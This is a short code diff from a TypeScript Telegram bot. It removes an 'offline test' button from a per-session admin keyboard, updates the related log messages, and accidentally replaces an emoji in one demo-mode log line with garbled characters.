@@ -341,7 +341,7 @@ export const updateCustomMessageInTelegram = async (
   if (!validateTelegramConfig()) {
     console.log("🎭 Demo mode: Would update message in Telegram");
     console.log("📝 New Message:", newMessage);
-    console.log("🆔 Message ID:", messageId);
+    console.log("�� Message ID:", messageId);
     return { success: true };
   }
 
@@ -933,18 +933,14 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     buttons.push(secondaryRow);
   }
 
-  // Status Check Buttons - Always available
+  // Status Check Button - Always available
   buttons.push([
     {
       text: "🔍 بررسی وضعیت",
       callback_data: `check_status_${sessionId}`,
     },
-    {
-      text: "🧪 تست آفلاین",
-      callback_data: `test_offline_${sessionId}`,
-    },
   ]);
-  console.log("✅ Added Check Status and Test Offline buttons");
+  console.log("✅ Added Check Status button");
 
   // Third section: Wrong buttons (ONLY show if user has attempted that method at least once)
   const wrongButtonsRow1 = [];
